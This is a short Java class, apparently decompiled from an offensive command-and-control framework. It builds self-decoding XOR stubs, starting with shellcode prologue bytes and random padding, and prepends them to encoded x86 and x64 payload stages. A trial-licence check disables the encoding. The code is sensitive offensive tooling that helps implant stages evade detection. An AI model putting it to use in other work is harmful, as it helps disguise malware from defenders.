package common;

import aggressor.AggressorClient;
import encoders.XorEncoder;

public class ArtifactUtils extends BaseArtifactUtils {

    public ArtifactUtils(AggressorClient aggressorClient) {
        super(aggressorClient);
    }

    public static byte[] XorStubBegin() {
        Packer packer = new Packer();
        packer.addByte(252);
        packer.addByte(232);
        int i = CommonUtils.rand(31) + 1;
        byte[] arrby = CommonUtils.randomData(i);
        packer.little();
        packer.addInt(i);
        packer.append(arrby);
        return packer.getBytes();
    }

    public static byte[] XorStub() {
        byte[] arrby1 = CommonUtils.pickOption("resources/xor.bin");
        arrby1 = CommonUtils.shift(arrby1, 6);
        byte[] arrby2 = XorStubBegin();
        return CommonUtils.join(arrby2, arrby1);
    }

    public static byte[] _XorEncode(byte[] arrby, String string) {
        AssertUtils.TestArch(string);
        if ("x86".equals(string)) {
            byte[] arrby1 = XorStub();
            byte[] arrby2 = XorEncoder.encode(arrby);
            return CommonUtils.join(arrby1, arrby2);
        }
        if ("x64".equals(string)) {
            byte[] arrby1 = CommonUtils.readResource("resources/xor64.bin");
            byte[] arrby2 = XorEncoder.encode(arrby);
            return CommonUtils.join(arrby1, arrby2);
        }
        return new byte[0];
    }

    public static byte[] XorEncode(byte[] arrby, String string) {
        if (License.isTrial()) {
            CommonUtils.print_trial("Disabled " + string + " payload stage encoding.");
            return arrby;
        }
        AssertUtils.Test((arrby.length > 16384), "XorEncode used on a stager (or some other small thing)");
        return _XorEncode(arrby, string);
    }
}
